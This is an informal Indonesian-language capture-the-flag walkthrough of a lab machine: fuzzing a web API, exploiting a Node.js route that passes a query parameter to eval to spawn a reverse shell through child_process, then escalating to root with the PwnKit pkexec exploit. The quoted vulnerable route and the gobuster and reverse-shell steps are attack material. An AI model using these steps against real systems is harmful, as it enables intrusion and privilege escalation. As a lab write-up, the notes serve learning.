# boot:
1. scan 80 doang yang kebuka -> webnya 502 -> fuzz aja ada secret -> ctrl + u -> ada path /api/access coba aja path nya
2. http://ip/api/access -> ada tuh token nya coba decode
3. dapet tuh -> coba ke home tadi ada header set cookie jadi ada cookie -> anti cookie jadi baseh64 yg dah di decode tadi
4. ada tuh web nya beda -> ctrl + u -> ke js -> ada fetch lagi get api lagi kesitu
5. fuzz aja api nya -> gobuster fuzz -m POST -u web/api/items?FUZZ=id -w seclistapi/object 
6. gini biar ga error soalnya ? di terminal malah lain -> kasih kutip aja 
7. gobuster fuzz -m POST -u "http://10.10.176.226/api/items?FUZZ=id" -w ~/wordlists/seclists/web-content/api/objects.txt
8. exclude aja length nya kalau banyak response
9. dapet tuh cmd -> pake burp aja biar method post -> revshell pakai require("child_process").exec("revshell")
10. ke /home/user dapet flag user -> revshell post ke items bisa di exploit karna ini:
11. router.post('/items', (req, res) => {
  if (req.query.cmd) res.send('vulnerability_exploited ' + eval(req.query.cmd));
  else res.status(400).json({ message: 'there_is_a_glitch_in_the_matrix' });
});



# pe:
1. gabisa sudo -l soalnya gatau passwd nya -> next cek /opt dulu ada doas tuh
2. cari aja doas exploit gimana
3. gada dah ternyata di linpeas vuln nya ini
4. Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                       [Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin
5. cek disini: https://github.com/ly4k/PwnKit
6. coba2 aja dah -> klaim root
